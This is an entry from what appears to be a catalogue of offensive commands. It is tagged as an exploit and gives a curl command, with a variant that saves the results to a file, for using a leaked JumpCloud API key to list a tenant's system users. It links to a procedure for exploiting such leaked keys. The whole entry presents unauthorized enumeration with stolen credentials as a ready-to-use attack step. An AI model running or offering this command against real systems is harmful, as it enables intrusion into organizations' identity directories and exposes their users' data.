---
data: 'curl -H "x-api-key: █████" "https://console.jumpcloud.com/api/systemusers"'
tags:
  - api
  - exploit
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: f30a580a-b8b8-4c06-ae19-e711728165a8
created_at: '2025-12-11T06:10:28.756Z'
updated_at: '2025-12-11T06:10:28.756Z'
verified: false
validated: true
submitted: true
---
# curl-jumpcloud-systemusers

## Command

```bash
curl -H "x-api-key: █████" "https://console.jumpcloud.com/api/systemusers"
```

## Description

This command uses curl to send a GET request to the JumpCloud system users endpoint, authenticating with a leaked API key to list users.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "x-api-key: █████"` | Adds the API key header for authentication | Yes |
| `"https://console.jumpcloud.com/api/systemusers"` | The endpoint to retrieve system user information | Yes |

## Examples

### Basic Usage

```bash
curl -H "x-api-key: █████" "https://console.jumpcloud.com/api/systemusers"
```

### Advanced Usage

```bash
curl -H "x-api-key: █████" "https://console.jumpcloud.com/api/systemusers" -o users.json
```

## Expected Output

A JSON response containing a list of system users, if the key is valid.

## Related

- [[commands/curl-jumpcloud-systems]]
- [[procedures/Exploit-Leaked-JumpCloud-API-Key-to-Access-Internal-Resources]]
